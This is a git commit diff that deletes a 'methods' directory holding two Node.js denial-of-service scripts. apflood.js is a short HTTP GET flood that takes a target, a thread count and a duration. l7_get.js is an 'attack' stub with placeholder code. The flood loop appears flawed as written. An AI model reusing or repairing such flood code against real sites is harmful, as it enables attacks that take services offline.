24384755c5a825ce0ed3a5d3e75a96521fc2067d
QuocHuy090 <118003147+QuocHuy090@users.noreply.github.com>
2026-06-05 20:39:18 +0700

    Delete methods directory

--- methods/apflood.js
+++
@@ -1,8 +0,0 @@
-var https=require('https'),http=require('http'),url=require('url');
-var t=process.argv[2],th=parseInt(process.argv[3])||100,dr=parseInt(process.argv[4])||60;
-if(!t)process.exit(1);
-var u=url.parse(t),s=u.protocol==='https:'?https:http;
-var ua=['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'];
-var running=true;setTimeout(function(){running=false},dr*1000);
-function f(){while(running){try{s.get({hostname:u.hostname,path:'/',headers:{'User-Agent':ua[Math.floor(Math.random()*2)]}},function(){})}catch(e){}}}
-for(var i=0;i<th;i++)f();
--- methods/l7_get.js
+++
@@ -1,9 +0,0 @@
-// GET Flood method
-const target = process.argv[2];
-const threads = parseInt(process.argv[3]);
-const duration = parseInt(process.argv[4]);
-
-console.log('TAN CONG:', target, threads, 'threads', duration, 's');
-
-// Code tấn công ở đây
-// ...
